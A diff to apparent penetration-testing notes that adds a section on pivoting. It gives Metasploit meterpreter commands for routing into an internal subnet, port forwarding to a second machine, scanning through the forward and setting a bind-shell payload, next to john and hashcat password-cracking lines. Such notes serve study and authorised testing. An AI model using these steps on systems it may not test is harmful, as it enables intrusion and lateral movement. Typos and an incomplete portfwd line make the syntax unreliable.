@@ -324,4 +324,19 @@ john --format=sha512crypt file_location -wwordlist=/usr/share/wordlists/rockyou.
 hashcat -a3 -m 1800 file_location wordlist_location
 ```
 ## Pivoting 
-+ 
++ used a compromoise host ot gain access to system within other networks
++ after gaining access to exploit other host on a private internal network
++ meterpeter provides us with the ability to add a network route to the internal subnet
+
+```
+meterpreter > run autoroute -s IP/20
+meterpreter >run autoroute -p
+meterpreter >background
+search portscan/tcp
+
+meterpreter > portfwd add -l 1234 -p -r IP_SECONDMACHINE
+nmap -sV -p 1234 localhost
+background
+set payload windows/meterpreter/bind_tcp
+
+```
